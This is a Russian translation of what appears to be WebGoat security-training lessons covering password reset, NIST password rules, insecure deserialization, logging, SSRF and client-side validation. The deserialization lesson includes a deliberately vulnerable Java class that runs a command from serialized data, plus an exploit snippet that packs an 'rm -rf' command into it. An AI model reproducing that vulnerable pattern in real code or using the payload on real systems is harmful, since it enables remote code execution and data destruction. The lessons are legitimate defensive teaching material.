*   **Контроль доступа:** Ограничьте доступ к ключам и службам подписи только для уполномоченного персонала.
*   **Ограничение частоты запросов (Rate limiting):** Внедрите ограничение частоты запросов, чтобы предотвратить попытки злоумышленников перебрать возможные значения "kid".
*   **Мониторинг:** Отслеживайте и регистрируйте действия, связанные с JWT, для обнаружения потенциального неправильного использования или подозрительного поведения.

Следуя этим лучшим практикам, вы можете снизить риск неправильного использования JWT с утверждением "kid" и повысить общую безопасность вашей системы.

---

##### **Лучшие практики

Некоторые лучшие практики при работе с JWT:

*   **Фиксируйте алгоритм:** Не позволяйте клиенту изменять алгоритм. Явно указывайте ожидаемый алгоритм при проверке.
*   **Используйте достаточную длину ключа:** Убедитесь, что вы используете соответствующую длину ключа при использовании симметричного ключа для подписи токена.
*   **Не храните личную информацию в утверждениях:** Убедитесь, что утверждения, добавленные в токен, не содержат личной информации. Если вам нужно добавить больше информации, рассмотрите возможность дополнительного шифрования токена.
*   **Добавляйте достаточные тестовые случаи:** Добавьте в ваш проект достаточные тестовые случаи, чтобы проверить, что недействительные токены действительно не работают. Интеграция с третьей стороной для проверки вашего токена не означает, что вам не нужно тестировать ваше приложение вообще.
*   **Ознакомьтесь с лучшими практиками:** Ознакомьтесь с лучшими практиками, упомянутыми в https://tools.ietf.org/html/rfc8725#section-2

---

#### **Сброс пароля

##### **Концепция

Этот урок рассказывает о функциональности сброса пароля, которая часто является упускаемой из виду частью приложения, что приводит к различным интересным логическим уязвимостям.

**Цели

Научить тому, как безопасно реализовать функциональность сброса пароля в вашем приложении.

**Введение

Каждый из нас хотя бы раз использовал функцию сброса пароля на веб-сайтах. Каждый сайт реализует эту функциональность по-разному. На некоторых сайтах вам нужно ответить на секретный вопрос, на другие вам приходит электронное письмо со ссылкой для активации. В этом уроке мы рассмотрим одну из самых распространенных функциональностей сброса пароля и покажем, когда она может работать неправильно.

До сих пор существуют компании, которые отправляют пароль в открытом тексте пользователю по электронной почте. Несколько примеров вы можете найти на http://plaintextoffenders.com/. Здесь вы найдете веб-сайты, которые все еще отправляют вам пароль в открытом тексте по email. Это не только должно заставить вас усомниться в безопасности сайта, но и означает, что они хранят ваш пароль в незашифрованном виде!

---

##### **Выяснение существования учетной записи

Как упоминалось ранее, во время сброса пароля вы часто можете увидеть разное сообщение в зависимости от того, существует электронный адрес или нет. Само по себе это может не казаться большой проблемой, но это может предоставить злоумышленнику информацию, которую можно использовать в фишинговой атаке. Если злоумышленник знает, что у вас есть зарегистрированная учетная запись на сайте, он может, например, создать фишинговое письмо и отправить его пользователю. Пользователь может быть более склонен кликнуть на письмо, потому что у него есть действительная учетная запись на веб-сайте. С другой стороны, для некоторых веб-сайтов это не так уж важно, но некоторые пользователи хотели бы большей конфиденциальности.

---

##### **Как предотвратить злоупотребление функцией сброса пароля

После того как вы узнали, как злоупотребить функцией сброса пароля, вы теперь также должны знать, как защитить свой собственный веб-сайт от таких атак. Если вы хотите получить подробное описание всех методов защиты, загляните сюда: https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html.

Этот урок резюмирует важные моменты, упомянутые в приведенной выше шпаргалке.

**Как использовать секретные вопросы для проверки пользователя

Секретные вопросы — это простой способ получить информацию о подлинности пользователя, не запрашивая у него проверочные данные. Проблема в том, что существует не так уж много типов секретных вопросов, и ответы на большинство вопросов одинаковы у многих пользователей. Это позволяет злоумышленнику просто угадать вопрос и ответ.

Простой способ усложнить угадывание секретного вопроса — позволить самому пользователю решить, на какой вопрос он хочет ответить. Дополнительную информацию по этой теме можно найти здесь: https://cheatsheetseries.owasp.org/cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#user-defined-security-questions

**Отправка данных по сети

Все, что отправляется по сети в любом направлении, может быть использовано злоумышленником. Некоторые данные облегчают злоумышленнику получение crucial информации об учетной записи пользователя, которая помогает обойти ограничения входа и сброса пароля. Поэтому старайтесь не отправлять информацию об учетной записи (имя пользователя, электронные адреса...) по сети во время процедуры сброса пароля, если она не была введена пользователем.

Например: если вы отправляете ссылку для сброса пароля пользователю по электронной почте, ни в коем случае не включайте имя пользователя в саму форму сброса пароля! Пользователю не нужно видеть свое имя пользователя в форме, потому что добросовестный пользователь уже знает свое имя. Сделайте так, чтобы злоумышленнику было как можно сложнее собрать дополнительную информацию.

**О токене сброса пароля

Токены сброса пароля позволяют пользователю сбросить пароль без передачи по сети безопасной информации для проверки пользователя. Следовательно, они должны быть безопасными. Такой токен должно быть трудно угадать. Токен также должен быть действителен только в течение короткого времени и должен становиться недействительным после успешного сброса пароля пользователем.

**Логирование действий пользователя

Само по себе логирование не может предотвратить атаки, но оно может облегчить определение того, что атака произошла, и как злоумышленник пытался обойти безопасность. Вы также можете использовать логи, чтобы определить, была ли учетная запись действительно взломана и нужно ли вернуть ее законному пользователю. Действия, которые вы можете логировать: Как были отвечены секретные вопросы? Когда произошел доступ к ссылке сброса пароля по сравнению с временем отправки письма? Были ли неудачные попытки?

**Двухфакторная аутентификация

Всегда безопаснее проводить процесс аутентификации через два или более отдельных способа на двух или более отдельных устройствах. Если пользователь хочет сбросить свой пароль, вы можете попросить его ввести проверочные коды, отправленные ему через SMS, мессенджер или аналогичные средства. Это затрудняет для злоумышленника обход процесса проверки, потому что ему нужен физический доступ к другому устройству. С другой стороны, это требует от пользователя предоставления вам дополнительной информации для связи, что не всем нравится.

**Дальнейшее чтение

Мы настоятельно рекомендуем дополнительно ознакомиться со шпаргалкой, ссылка на которую приведена во введении! Функциональность сброса пароля легко использовать злоумышленнику при неправильной реализации. Вы можете усложнить злоумышленнику ее использование, просто следуя нескольким рекомендациям, приведенным здесь и в шпаргалке!

---

#### **Безопасные пароли

##### **Концепция

В этом уроке пользователь научится создавать надежные пароли и безопасно их хранить. Мы рассмотрим самые важные рекомендации стандарта паролей NIST.

**Цели:**
*   Пользователь знает, как должен выглядеть надежный пароль и каким требованиям он должен соответствовать.
*   Пользователь имеет базовое представление о том, на что обращать внимание при разработке приложения, которое хранит пароли.

---

##### **Национальный институт стандартов и технологий (NIST)

Национальный институт стандартов и технологий (NIST) — это нерегулирующее федеральное агентство в составе Министерства торговли США.

Его миссия — способствовать инновациям и промышленной конкурентоспособности США путем развития измерительной науки, стандартов и технологий способами, которые усиливают экономическую безопасность и улучшают качество нашей жизни.

NIST разрабатывает Федеральные стандарты обработки информации (FIPS), которые утверждаются министром торговли, и федеральные агентства должны их соблюдать.

NIST также предоставляет руководящие документы и рекомендации через свою серию специальных публикаций (SP) 800. Эти рекомендации часто становятся основой для лучших практик в индустрии безопасности и включаются в другие стандарты.

(Описание с https://www.enzoic.com/surprising-password-guidelines-nist/)

---

##### **Стандарт паролей NIST

Стандарт паролей NIST (также известный как серия специальных публикаций (SP) 800) — это руководство, содержащее рекомендации по реализации безопасных парольных систем.

**Правила для паролей

Вот некоторые из самых важных рекомендаций последнего стандарта NIST:

*   **Отсутствие правил состава**  
    Не требуйте от пользователя, например, использовать хотя бы одну заглавную букву и специальный символ в своем пароле. Позвольте им это сделать, но не заставляйте!

*   **Отсутствие подсказок к паролю**  
    Если вы хотите, чтобы у людей был больший шанс угадать ваш пароль, напишите его на записке, прикрепленной к экрану. (Т.е. не используйте подсказки).

*   **Отсутствие секретных вопросов**  
    Секретные вопросы, также известные как аутентификация на основе знаний (KBA), устарели. Спросить пользователя: «Как зовут вашего питомца?» или что-то подобное, чтобы проверить, что это он, довольно небезопасно.

*   **Отсутствие ненужной смены паролей**  
    Если вы хотите, чтобы пользователи соблюдали правила и выбирали длинные, трудные для угадывания пароли, вы не должны заставлять их менять эти пароли без необходимости по истечении определенного периода.

*   **Минимальный размер 8 символов**  
    Надежный пароль в наше время должен иметь длину как МИНИМУМ 8 символов (до 64). Это минимум, а не максимум-минимум!

*   **Поддержка всех символов ЮНИКОД**  
    Вам следует разрешать все kinds of символы ЮНИКОД в пароле. Это также включает смайлики и пробелы.

*   **Проверка пароля на соответствие известным плохим вариантам**
    *   пароли, полученные из предыдущих утечек данных
    *   словарные слова
    *   повторяющиеся или последовательные символы (например, 'aaaaaa', '1234abcd')
    *   контекстно-зависимые слова, такие как название сервиса, имя пользователя и их производные

**Удобство использования

Помимо приведенных выше рекомендаций, стандарт NIST также рекомендует повышать удобство использования форм для паролей, чтобы увеличить вероятность того, что пользователи выберут надежный и безопасный пароль. Некоторые из них:

*   **Разрешить вставку в поле ввода пароля**  
    Пользователи должны иметь возможность использовать функцию «вставить» при вводе пароля. Поскольку это облегчает использование менеджеров паролей, это также увеличивает вероятность того, что пользователь выберет надежный пароль.

*   **Разрешить отображение пароля**  
    Поля ввода пароля должны иметь опцию для отображения введенного пароля, чтобы помочь пользователю успешно ввести пароль.

*   **Предложить индикатор надежности**  
    Добавьте индикатор надежности на страницу создания пароля, чтобы помочь пользователю выбрать надежный и безопасный пароль.

---

##### **Надежны ли ваши пароли?

А как насчет вас? Надежны ли ваши пароли?

Существуют специальные веб-сайты, которые позволяют проверить, была ли одна из ваших учетных записей скомпрометирована в прошлых утечках данных.
Перейдите, например, на **Have I Been Pwned** и проверьте, не была ли ваша учетная запись взломана. Если да, лучше немедленно смените пароли!

Что вы можете сделать для повышения безопасности своей учетной записи?

*   **Используйте разные пароли для разных аккаунтов**  
    Это хорошая практика — НЕ использовать один и тот же пароль для нескольких учетных записей, а вместо этого использовать разные пароли.

*   **Используйте парольные фразы**  
    Используйте генераторы парольных фраз, такие как **Diceware**, для создания парольных фраз. Парольные фразы — это пароли, состоящие из нескольких слов, а не случайно сгенерированных последовательностей символов. Это делает их намного легче для запоминания нам, людям. И, кстати: чем длиннее, тем лучше!

*   **Используйте менеджер паролей**  
    Если вы не можете запомнить свои разные пароли, используйте менеджер паролей для создания и безопасного хранения ваших паролей.

*   **Используйте двухфакторную аутентификацию**  
    По возможности используйте методы двухфакторной аутентификации, чтобы добавить дополнительный уровень безопасности к вашим учетным записям.

---

##### **Хранение паролей

После создания надежного и безопасного пароля его также необходимо безопасно хранить. NIST дает рекомендации о том, как приложениям следует обращаться с паролями и как безопасно их хранить.

**Как следует хранить пароль?

*   **Прежде всего: используйте шифрование и защищенный канал для запроса паролей**  
    Проверяющая сторона должна использовать одобренное шифрование и аутентифицированный защищенный канал, чтобы противостоять прослушиванию и атакам "человек посередине" (MitM) при запросе запомненных секретов (паролей).

*   **Устойчивость к оффлайн-атакам**  
    Пароли должны храниться в форме, устойчивой к оффлайн-атакам.

*   **Используйте "соль" (salt)**  
    Пароли должны "солиться" перед сохранением. "Соль" должна иметь длину не менее 32 бит и должна выбираться произвольно, чтобы минимизировать коллизии значений соли среди хранимых хешей.

*   **Используйте хеширование**  
    Перед сохранением пароль должен быть хеширован с помощью односторонней функции формирования ключа. Функция принимает на вход пароль, "соль" и коэффициент стоимости, а затем генерирует хеш пароля. Примеры подходящих функций формирования ключа:
    *   Функция формирования ключа на основе пароля 2 (PBKDF2) (как можно больше ⇒ как минимум 10 000 итераций)
    *   **Bcrypt**
    *   **Scrypt**
    *   **Argon2**

*   **Функция формирования ключа, требовательная к памяти**  
    Используйте функции формирования ключа, требовательные к памяти (memory-hard), чтобы еще больше увеличить стоимость проведения атак.

*   **Высокий коэффициент стоимости**  
    Коэффициент стоимости (количество итераций) функции формирования ключа должен быть настолько большим, насколько это позволяет производительность сервера проверки. (не менее 10 000 итераций)

---

### **(A8) Нарушения целостности программного обеспечения и данных (Software and Data Integrity Failures)**  

#### **Небезопасная десериализация

##### **Концепция

Этот урок описывает, что такое сериализация, и как ею можно манипулировать для выполнения задач, не входивших в первоначальный замысел разработчика.

**Цели
*   Пользователь должен иметь базовое понимание языка программирования Java.
*   Пользователь сможет обнаруживать уязвимости небезопасной десериализации.
*   Пользователь сможет эксплуатировать уязвимости небезопасной десериализации.
*   Эксплуатация десериализации немного отличается в других языках программирования, таких как PHP или Python, но ключевые концепции, изученные здесь, применимы ко всем из них.

---

##### **Что такое сериализация

Сериализация — это процесс преобразования объекта в формат данных, который может быть восстановлен позже. Объекты часто сериализуют, чтобы сохранить их в хранилище или отправить как часть коммуникации. Десериализация — это обратный процесс, принимающий структурированные данные из некоторого формата и воссоздающий из них объект. Сегодня самым популярным форматом данных для сериализации является JSON. До этого это был XML.

Пример сериализованных данных (в разных форматах):
`a:4:{i:0;i:132;i:1;s:7:"Malory";i:2;s:4:"user";i:3;s:32:"b6a...f66";}`

**Нативная сериализация

Многие языки программирования предлагают встроенную возможность для сериализации объектов. Эти собственные форматы обычно предлагают больше возможностей, чем JSON или XML, включая настраиваемость процесса сериализации. К сожалению, функции этих механизмов нативной десериализации могут быть использованы в злонамеренных целях при работе с ненадежными данными. Было обнаружено, что атаки на десериализаторы позволяют проводить атаки на отказ в обслуживании, контроль доступа и удаленное выполнение кода.

**Языки программирования, подверженные уязвимостям

*   PHP
*   Python
*   Ruby
*   Java
*   C
*   C++

**Данные, а не код

Сериализуются ТОЛЬКО данные. Сам код не сериализуется. Десериализация создает новый объект и копирует все данные из потока байтов, чтобы получить объект, идентичный объекту, который был сериализован.

---

##### **Простейший эксплойт

**Уязвимый код

Следующий код является хорошо известным примером уязвимости десериализации в Java.

```java
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject) ois.readObject();
```

Он ожидает объект `AcmeObject`, но он выполнит `readObject()` до того, как произойдет приведение типа (casting). Если злоумышленник найдет подходящий класс, реализующий опасные операции в методе `readObject()`, он может сериализовать этот объект и заставить уязвимое приложение выполнить эти действия.

**Класс, присутствующий в ClassPath

Злоумышленникам необходимо найти класс в classpath, который поддерживает сериализацию и имеет опасные реализации в `readObject()`.

```java
package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

    private static final long serialVersionUID = 1;

    private String taskName;
    private String taskAction;
    private LocalDateTime requestedExecutionTime;

    public VulnerableTaskHolder(String taskName, String taskAction) {
        super();
        this.taskName = taskName;
        this.taskAction = taskAction;
        this.requestedExecutionTime = LocalDateTime.now();
    }

    private void readObject( ObjectInputStream stream ) throws Exception {
        // десериализируем данные, так как taskName и taskAction теперь доступны
        stream.defaultReadObject();

        // СЛЕПО ВЫПОЛНЯЕМ КОД, УЯЗВИМОСТЬ ТИПА "INJECTION"
        Runtime.getRuntime().exec(taskAction);
    }
}
```

**Эксплойт

Если указанный выше Java-класс существует, злоумышленники могут сериализовать этот объект и получить Удаленное Выполнение Кода (RCE).

```java
VulnerableTaskHolder go = new VulnerableTaskHolder("delete all", "rm -rf somefile");

ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(go);
oos.flush();
byte[] exploit = bos.toByteArray();
```

---

##### **Что такое цепочка гаджетов (Gadget Chain)

Странно (но такое может случиться) найти гаджет, который сам по себе выполняет опасные действия при десериализации. Однако гораздо проще найти гаджет, который выполняет действие над другим гаджетом при его десериализации, и этот второй гаджет выполняет больше действий над третьим гаджетом, и так далее, пока не будет запущено действительно опасное действие. Этот набор гаджетов, который можно использовать в процессе десериализации для достижения опасных действий, называется "Цепочкой гаджетов" (Gadget Chain).

Поиск гаджетов для построения цепочек гаджетов — это активная тема для исследователей безопасности. Этот вид исследований обычно требует затрат большого количества времени на чтение кода.

---

### **(A9) Недостатки журналирования безопасности (Security Logging and Monitoring Failures)**  

#### **Безопасность журналирования

##### **Концепция

Логирование очень важно для современных систем. Мы используем его по разным причинам:

*   Мониторинг и отладка приложений.
*   Аудит-логи: Например, запись определенных действий ваших пользователей и систем.
*   Мониторинг событий безопасности: Например, предоставление информации в SIEM или SOAR систему, которая будет срабатывать на основе информации, предоставленной в этих логах.

**Цели
*   Пользователь должен иметь базовое понимание логирования и для чего оно нужно.
*   Пользователь понимает риски подделки логов и утечки информации из логов.
*   Пользователь сможет выполнить простую атаку подделки логов.
*   Пользователь сможет назвать основные риски, связанные с логированием.

---

##### **Подробнее о логировании

Как вы уже можете понять, подделка логов (log-spoofing) может стать проблемой, когда пользователи пытаются их фальсифицировать. Существуют различные способы сделать это, помимо отправки формы. Подумайте, например, о параметрах URL или специально созданных JSON-полезных нагрузках. Поэтому важно:

*   применять надлежащую санитаризацию ввода (input-sanitization)
*   убедиться, что вы можете установить подлинность источника и реализовать контроль целостности для обнаружения подделки логов (log-tampering).
*   убедиться, что пользователь не может выбирать логи из любого канала
*   убедиться, что хранилище логов защищено

Но безопасность логирования — это не только защита от атак подделки. Давайте взглянем на логирование конфиденциальной информации.

**Логирование конфиденциальной информации

В предыдущих упражнениях мы видели только имя пользователя, но не пароль. Почему? Потому что мы хотим убедиться, что журнал приложения не содержит никакой конфиденциальной информации. Давайте убедимся, что если наши логи будут скомпрометированы, нам не придется бояться повторного использования аутентификационной информации.

Аналогично, мы не должны логировать любую другую конфиденциальную информацию, такую как симметричные или приватные ключи, токены доступа и тому подобное.

**Логирование персональной информации

Будьте осторожны с логированием персональной информации. Например: не логируйте данные банковского счета, личную идентифицирующую информацию, на логирование которой пользователь не давал согласия. Не логируйте факты, которые могут установить личность субъекта, действия которого логируются.

Что вы в основном хотите предотвратить, так это то, чтобы люди использовали логи для профилирования людей или шпионажа за ними. Вы хотите защитить приватность субъектов, использующих вашу систему.

**Особый случай: Access Logs (Логи доступа)

Особым случаем всегда являются логи доступа, предоставляемые вашим ingress-сервером и/или сервером приложений. Эти логи должны содержать как минимум несколько вещей: Откуда пришел запрос, когда был сделан запрос и, возможно, каков был код ответа. Дополнительная информация может быть представлена в логе доступа, в зависимости от защищенности самого лога. Например: вы не хотите сохранять сырой запрос в логах доступа, чтобы защитить приватность ваших пользователей.

И здесь часто начинается проблема: логи доступа иногда захватывают полный URL, использованный для запроса. Это может включать конфиденциальные параметры URL. Поэтому будьте осторожны с тем, что вы помещаете в URL в качестве параметров, и давайте убедимся, что вы не логируете их в открыто доступном логе.

**Читать далее

Хотите узнать больше о логировании? Взгляните на:

*   The OWASP Logging Cheat sheet
*   GDPR article at Wikipedia

---

##### **Подробнее о логировании (2)

К настоящему моменту должно быть ясно, что использование простого кодирования/декодирования не является способом защиты конфиденциальной информации в логе. Вместо этого лучше использовать другие техники: вообще не логировать данные, затирать их или шифровать с помощью другого общего секрета.

Есть еще несколько тем, которые мы могли бы затронуть здесь:

*   Как работать с уровнями логирования (log-levels)
*   Как обрабатывать исключения (Exception Handling)
*   Как использовать логирование для других целей
*   Некоторые ресурсы для изучения.

**Уровни логирования (Log Levels)

Объяснение уровней логирования (например, DEBUG, INFO, WARN, ERROR). Каждый уровень предназначен для определенного типа сообщений и помогает фильтровать важную информацию от шума.

**Обработка исключений (Exception Handling)

(Возможно, пример логирования исключения, которое раскрывает клиенту криптографические детали, и почему это плохая идея). Важно не логировать стектрейсы или сообщения об ошибках, которые могут раскрыть внутреннюю структуру приложения или конфиденциальные данные злоумышленнику.

**Аудит-логи, Мониторинг событий безопасности и Логи приложений

Обратите внимание, что логирование часто используется не только для отладки приложений. Логи приложений часто используются как источник данных для других целей, подумайте о:

*   **Аудит-логирование:** Конкретные события должны записываться вашим журналом приложения для создания "следа", который можно использовать для восстановления действий, совершенных от имени/вашим пользователем. Это может later быть использовано, например, в суде для доказательства того, что произошло в случае спора.
*   **Мониторинг событий безопасности (SEM):** События, генерируемые вашим приложением, часто могут использоваться вашим отделом безопасности для понимания того, что происходит в ландшафте приложений организации. Существуют различные типы событий, а также различные атрибуты, которые могут играть роль в обнаружении того, что организация в опасности. Например: привилегированный административный вход в систему, который используется только в качестве процедуры на случай чрезвычайной ситуации (break-glass), уже может быть очень ценным событием для них. Другой пример: хотя часто используемые административные логины полезно записывать, они сами по себе могут вызвать событие в отделе безопасности, если только для этой административной роли не используется совершенно другое местоположение. Упражнение по моделированию угроз (threat model exercise) с вашим отделом безопасности часто может помочь понять, какие типы логов им требуются и на что они должны немедленно вызывать оповещение безопасности.
*   **Обнаружение мошенничества:** Ваши логи приложения могут помочь в обнаружении мошенничества. Например, логи, показывающие, что кто-то пытается переместить больше денег, чем у него есть, могут указывать на то, что что-то идет не так.
*   **Мониторинг бизнес-процессов:** Ваши логи приложения могут использоваться для отслеживания, продолжают ли бизнес-процессы выполняться так, как должны. Например, отсутствие новых событий далее по процессу может указывать на то, что бизнес-процесс остановился. Это может быть ценной информацией для бизнеса, когда дело доходит до управления компанией.
*   И многое другое...

Обратите внимание, что многие из этих целей логирования довольно сильно отличаются друг от друга! Поэтому лучше отделять ваше отладочное логирование приложения от SEM и аудит-логов с точки зрения вывода вашим приложением, хранения и обработки логов внутри вашей организации.

**Дополнительное чтение

*   The OWASP Logging Cheat Sheet

---

### **(A10) Подделка межсайтовых запросов на стороне сервера (Server-Side Request Forgery)**  

#### **Подделка запроса на стороне сервера (SSRF)

##### **Концепция

При атаке типа "Подделка запроса на стороне сервера" (SSRF) злоумышленник может злоупотребить функциональностью на сервере для чтения или обновления внутренних ресурсов. Злоумышленник может предоставить или изменить URL, который код, работающий на сервере, будет читать или отправлять данные. Более того, тщательно выбирая URL-адреса, злоумышленник может читать конфигурацию сервера, такую как метаданные AWS, подключаться к внутренним службам, таким как базы данных с включенным HTTP, или выполнять POST-запросы к внутренним службам, которые не предназначены для публичного доступа.

**Цели

В упражнениях на следующих страницах вам нужно изучить, что браузер отправляет на сервер, и изменить запрос, чтобы получить от сервера другую информацию.

**SSRF How-To

*   https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF
*   A New Era of SSRF by Orange Tsai

---

##### **Защита

Чтобы предотвратить уязвимости SSRF в веб-приложениях, рекомендуется придерживаться следующих рекомендаций:

*   Используйте белый список разрешенных доменов, ресурсов и протоколов, откуда веб-сервер может получать ресурсы.
*   Любой ввод, принятый от пользователя, должен быть проверен и отклонен, если он не соответствует ожидаемой позитивной спецификации.
*   По возможности, не принимайте пользовательский ввод в функциях, которые контролируют, откуда веб-сервер может получать ресурсы.

**Ссылки

*   https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

---

### **Клиентская сторона (Client-Side)** 

#### Обход фронтенд-ограничений

##### **Концепция

Пользователи имеют большую степень контроля над фронтендом веб-приложения. Они могут изменять HTML-код, а иногда и скрипты. Приложения, которые требуют определенного формата ввода, также должны проводить валидацию на стороне сервера.

**Цели

*   Пользователь должен иметь базовые знания HTML
*   Пользователь должен уметь изменять запрос перед отправкой (с помощью прокси или других инструментов)
*   Пользователь сможет обходить ограничения полей и клиентскую валидацию

---

#### **Клиентская фильтрация

##### **Клиентская фильтрация

Всегда является хорошей практикой отправлять клиенту только ту информацию, к которой у него должен быть доступ. В этом уроке на клиент отправляется слишком много информации, что создает серьезную проблему контроля доступа. В этом упражнении ваша задача — использовать избыточную информацию, возвращаемую сервером, чтобы обнаружить информацию, к которой у вас не должно быть доступа.

---

#### Изменение HTML

##### **Концепция

Браузеры обычно предлагают множество опций для редактирования отображаемого контента. Поэтому разработчики должны осознавать, что значения, отправленные пользователем, могли быть изменены.

**Цели**
*   Пользователь должен иметь базовое понимание HTML
*   Пользователь сможет эксплуатировать возможность редактирования фронтенда веб-сайта

---

##### **Защита

В этом простом примере вы заметили, что цена рассчитывается на стороне клиента и отправляется на сервер. Сервер принял ввод как данный и не пересчитывал цену. Одна из мер защиты в этом случае — найти цену телевизора в вашей базе данных и заново рассчитать общую стоимость.

В реальном приложении вы никогда не должны полагаться на клиентскую валидацию. Важно проверять все входные данные, отправленные клиентом. Всегда помните: НИКОГДА НЕ ДОВЕРЯЙТЕ ВВОДУ, ОТПРАВЛЕННОМУ КЛИЕНТОМ.

**Ссылки
https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html

---

### **Испытания (Challenges)**

#### **Администратор забыл пароль**

##### **Добро пожаловать в испытание WebGoat (CTF)

Испытания содержат уроки в стиле CTF, где мы не предоставляем никаких объяснений о том, что вам нужно делать, подсказки предоставлены не будут. Вы можете использовать эти испытания в стиле CTF, где вы можете запустить WebGoat на одном сервере, и все участники могут присоединиться и взламывать задания. Таблица лидеров доступна по адресу: `scoreboard`

В этом CTF вам нужно будет решить несколько заданий, каждое задание даст вам флаг, который вам нужно будет отправить, чтобы получить очки.

Флаги имеют следующий формат: `XX-XX-XX-XX-XX` (например: `2f179559-9664-fcc9-6911-577967288`)

**Правила
*   Не пытайтесь взломать инфраструктуру соревнования. Если вы случайно найдете ошибку или уязвимость, пожалуйста, отправьте нам электронное письмо.
*   Играйте честно, не пытайтесь саботировать другие команды-соперники или каким-либо образом препятствовать прогрессу другой команды.
*   Перебор заданий / флагов запрещен.

---
